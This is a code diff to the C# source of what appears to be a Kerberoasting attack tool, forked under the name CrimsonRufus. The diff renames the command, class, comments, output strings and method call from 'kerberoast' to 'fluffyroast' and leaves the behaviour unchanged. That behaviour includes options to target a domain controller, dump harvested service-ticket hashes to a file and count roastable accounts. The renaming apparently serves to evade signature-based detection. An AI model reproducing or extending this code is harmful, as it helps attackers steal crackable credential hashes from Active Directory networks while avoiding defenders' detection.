@@ -6,13 +6,13 @@ using System.Text;
 
 namespace CrimsonRufus.Commands
 {
-    public class Kerberoast : ICommand
+    public class Fluffyroast : ICommand
     {
-        public static string CommandName => "kerberoast";
+        public static string CommandName => "fluffyroast";
 
         public void Execute(Dictionary<string, string> arguments)
         {
-            Console.WriteLine("\r\n[] Action: Kerberoasting\r\n");
+            Console.WriteLine("\r\n[] Action: Fluffyroasting\r\n");
 
             string spn = "";
             List<string> spns = null;
@@ -83,17 +83,17 @@ namespace CrimsonRufus.Commands
             }
             if (arguments.ContainsKey("/dc"))
             {
-                // use a specific domain controller for kerberoasting
+                // use a specific domain controller for fluffyroasting
                 dc = arguments["/dc"];
             }
             if (arguments.ContainsKey("/outfile"))
             {
-                // output kerberoasted hashes to a file instead of to the console
+                // output fluffyroasted hashes to a file instead of to the console
                 outFile = arguments["/outfile"];
             }
             if (arguments.ContainsKey("/simple"))
             {
-                // output kerberoasted hashes to the output file format instead, to the console
+                // output fluffyroasted hashes to the output file format instead, to the console
                 simpleOutput = true;
             }
             if (arguments.ContainsKey("/aes"))
@@ -186,7 +186,7 @@ namespace CrimsonRufus.Commands
 
             if (arguments.ContainsKey("/stats"))
             {
-                // output stats on the number of kerberoastable users, don't actually roast anything
+                // output stats on the number of fluffyroastable users, don't actually roast anything
                 listUsers = true;
             }
 
@@ -248,7 +248,7 @@ namespace CrimsonRufus.Commands
                 return;
             }
 
-            Roast.Kerberoast(spn, spns, user, OU, domain, dc, cred, outFile, simpleOutput, TGT, useTGTdeleg, supportedEType, pwdSetAfter, pwdSetBefore, ldapFilter, resultLimit, delay, jitter, listUsers, enterprise, autoenterprise, ldaps, nopreauth);
+            Roast.Fluffyroast(spn, spns, user, OU, domain, dc, cred, outFile, simpleOutput, TGT, useTGTdeleg, supportedEType, pwdSetAfter, pwdSetBefore, ldapFilter, resultLimit, delay, jitter, listUsers, enterprise, autoenterprise, ldaps, nopreauth);
         }
     }
 }
